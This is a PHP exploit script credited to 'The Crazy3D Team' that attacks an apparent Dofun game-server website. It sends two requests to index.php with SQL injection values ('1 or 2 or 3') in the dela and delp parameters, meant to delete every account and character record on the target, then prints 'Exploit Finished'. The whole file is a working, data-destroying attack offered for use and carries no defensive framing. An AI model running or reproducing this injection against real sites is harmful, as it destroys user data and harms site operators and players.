<?php

/*
!dofun_delete
@ HOST = localhost = Target URL
@ PORT = 80 = Target PORT
@ PATH = / = Web site path
*/
//error_reporting(0);
set_time_limit(0);
$host = $argv[1];
$port = $argv[2];
$path = $argv[3];
print "\n+-----------------------[ The Crazy3D Team ]--------------------------+";
print "\n| Dofun Accounts/Character Delete                                     |";
print "\n|                                by The UnKn0wN                       |";
print "\n|     Greets to : The Crazy3D's members and all Algerian h4x0rs       |";
print "\n+---------------------------------------------------------------------+";
print "\n|                         www.RPG-Exploit.com                         |";
print "\n+---------------------------------------------------------------------+\n";
print "Deleting accounts ...";
file_get_contents("http://".$host."".$path."index.php?p=perso&dela=1%20or%202%20or%203"); 
print"Done ! \n";
sleep(1);
print "Deleting characters ...";
file_get_contents("http://".$host."".$path."index.php?p=perso&delp=1%20or%202%20or%203"); 
print"Done ! \n Exploit Finished Check by your self!\n";